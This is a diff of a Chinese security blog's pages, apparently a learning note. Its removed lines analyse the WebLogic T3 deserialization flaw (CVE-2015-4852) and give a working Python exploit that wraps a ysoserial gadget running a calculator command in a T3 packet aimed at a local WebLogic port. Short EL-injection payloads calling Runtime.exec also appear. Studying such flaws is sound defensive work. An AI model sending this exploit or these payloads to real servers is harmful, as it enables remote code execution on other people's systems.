-<p>T3协议的包非常简洁，发了T3包的话，就会返回Weblogic的版本号。</p>
-<p><em><strong>分析</strong></em></p>
-<p><img src="/2026/06/22/weblogic1/weblogic1.png" alt="截图"></p>
-<p>所有的T3流量都会经过<code>InboundMsgAbbrev</code>，走到case0。他会先new一个类出来我们看一下</p>
-<p><img src="/2026/06/22/weblogic1/weblogic2.png" alt="截图"></p>
-<p>这个类继承了ObjectInputStream，且只有图上这些方法。所以说readObject调用的就是ObjectInputStream的readObject了。跟jdk原生的反序列化的唯一的区别就是resolveClass。</p>
-<p><img src="/2026/06/22/weblogic1/weblogic3.png" alt="截图"></p>
-<p>总的来说还是调用了ObjectInputStream的resolveClass()，这个方法的后续处理没什么影响。剩下的部分就跟jdk的反序列化没有区别了。</p>
-<blockquote>
-<p>学到这里才发现我对jdk原生的反序列化流程并不了解，一直以为会直接调用序列化传过来的类的readObject方法。</p>
-</blockquote>
-<p>这是网上找的利用代码，根据自己的环境稍作修改的版本。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_payload1</span>(<span class="params">gadget, command</span>):</span><br><span class="line">    JAVA_BIN = <span class="string">&#x27;/Library/Java/JavaVirtualMachines/jdk1.7.0_21.jdk/Contents/Home/bin/java&#x27;</span></span><br><span class="line">    JAR_FILE = <span class="string">&#x27;ysoserial.jar&#x27;</span></span><br><span class="line">    popen = subprocess.Popen([JAVA_BIN, <span class="string">&#x27;-jar&#x27;</span>, JAR_FILE, gadget, command], stdout=subprocess.PIPE)</span><br><span class="line">    <span class="keyword">return</span> popen.stdout.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_payload2</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>(<span class="params">host, port, payload</span>):</span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.connect((host, port))</span><br><span class="line"></span><br><span class="line">    handshake = <span class="string">&quot;t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n&quot;</span>.encode()</span><br><span class="line">    sock.sendall(handshake)</span><br><span class="line">    data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(<span class="string">r&quot;HELO:(.*).false&quot;</span>)</span><br><span class="line">    version = re.findall(pattern, data.decode())</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(version) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Not Weblogic&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Weblogic &#123;&#125;&quot;</span>.<span class="built_in">format</span>(version[<span class="number">0</span>]))</span><br><span class="line">    data_len = binascii.a2b_hex(<span class="string">b&quot;00000000&quot;</span>) <span class="comment">#数据包长度，先占位，后面会根据实际情况重新</span></span><br><span class="line">    t3header = binascii.a2b_hex(<span class="string">b&quot;016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006&quot;</span>) <span class="comment">#t3协议头</span></span><br><span class="line">    flag = binascii.a2b_hex(<span class="string">b&quot;fe010000&quot;</span>) <span class="comment">#反序列化数据标志</span></span><br><span class="line">    payload = data_len + t3header + flag + payload</span><br><span class="line">    payload = struct.pack(<span class="string">&#x27;&gt;I&#x27;</span>, <span class="built_in">len</span>(payload)) + payload[<span class="number">4</span>:] <span class="comment">#重新计算数据包长度</span></span><br><span class="line">    sock.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    host = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">    port = <span class="number">7001</span></span><br><span class="line">    gadget = <span class="string">&quot;Jdk7u21&quot;</span> <span class="comment">#CommonsCollections1 Jdk7u21</span></span><br><span class="line">    command = <span class="string">&quot;open -a calculator&quot;</span></span><br><span class="line"></span><br><span class="line">    payload = get_payload1(gadget, command)</span><br><span class="line">    exp(host, port, payload)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>总的来说就是把序列化数据包装成T3数据</p>
-<p><em><strong>修复</strong></em></p>
-<p>在resolveClass里放了个黑名单，禁止一些类反序列化。</p>
-<p>参考文章:<a target="_blank" rel="noopener" href="https://drun1baby.top/2022/11/28/CVE-2015-4852-WebLogic-T3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/">https://drun1baby.top/2022/11/28/CVE-2015-4852-WebLogic-T3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/226070">https://www.anquanke.com/post/id/226070</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/nice0e3/p/14127885.html">https://www.cnblogs.com/nice0e3/p/14127885.html</a></p>
-
+          <!--noindex-->
+          <!--/noindex-->
+        
       
     </div>
 
@@ -690,8 +551,17 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2026-06-22 16:12:39" itemprop="dateModified" datetime="2026-06-22T16:12:39+08:00">2026-06-22</time>
+                <time title="修改时间：2026-06-26 21:20:31" itemprop="dateModified" datetime="2026-06-26T21:20:31+08:00">2026-06-26</time>
               </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Java%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Java安全</span></a>
+                </span>
+            </span>
 
           <br>
             <span class="post-meta-item" title="本文字数">
@@ -715,14 +585,9 @@
 <p>不是很了解，简单写一写</p>
 </blockquote>
 <p>el表达式不是一定要在jsp上才能用的，也可以在java代码中使用。</p>
-<p>跟SpEL一样，用一个EL表达式的解析起来解析EL表达式。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 基础算术运算</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">result1</span> <span class="operator">=</span> elp.eval(<span class="string">&quot;1 + 2 * 3&quot;</span>);</span><br><span class="line">System.out.println(result1); <span class="comment">// 输出: 7</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 字符串操作与逻辑判断</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">result2</span> <span class="operator">=</span> elp.eval(<span class="string">&quot;empty &#x27;&#x27; ? &#x27;Empty&#x27; : &#x27;Not Empty&#x27;&quot;</span>);</span><br><span class="line">System.out.println(result2); <span class="comment">// 输出: Empty</span></span><br></pre></td></tr></table></figure>
-<p>可以像这样用。</p>
-<p>之前在jndi的高版本绕过中就用过。</p>
-<p>简单的利用方法:</p>
-<p>“”.getClass().forName(‘java.lang.Runtime’).getMethod(‘getRuntime’).invoke(null).exec(‘open -a calculator’)</p>
-<p>pageContext().request.getServletContext().getClassLoader().loadClass(“恶意类”).loadClass()</p>
-
+          <!--noindex-->
+          <!--/noindex-->
+        
       
     </div>
 
